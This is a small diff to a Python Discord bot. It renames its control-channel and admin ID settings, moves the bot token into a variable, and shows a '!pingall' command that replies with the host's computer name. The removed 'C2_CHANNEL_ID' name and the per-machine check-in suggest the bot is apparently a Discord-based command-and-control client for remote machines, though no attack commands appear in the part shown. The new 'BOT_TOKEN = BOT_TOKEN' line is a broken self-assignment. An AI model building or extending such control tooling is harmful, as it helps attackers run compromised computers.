@@ -12,8 +12,9 @@ intents.message_content = True
 client = discord.AutoShardedClient(intents=intents)
 
 # CONFIGURATION
-CONTROL_CHANNEL_ID = C2_CHANNEL_ID  
-ADMIN_USER_ID = ADMIN_DISCORD_USER_ID      
+CONTROL_CHANNEL_ID = DISCORD_CHANNEL_ID
+ADMIN_USER_ID = ADMIN_DISCORD_ID
+BOT_TOKEN = BOT_TOKEN
 
 COMPUTER_NAME = platform.node().upper()
 
@@ -97,4 +98,4 @@ async def on_message(message):
     elif message.content.strip() == "!pingall":
         await message.channel.send(f"👋 `[{COMPUTER_NAME}]` is alive and active!")
 
-client.run("BOT_TOKEN")
+client.run(BOT_TOKEN)
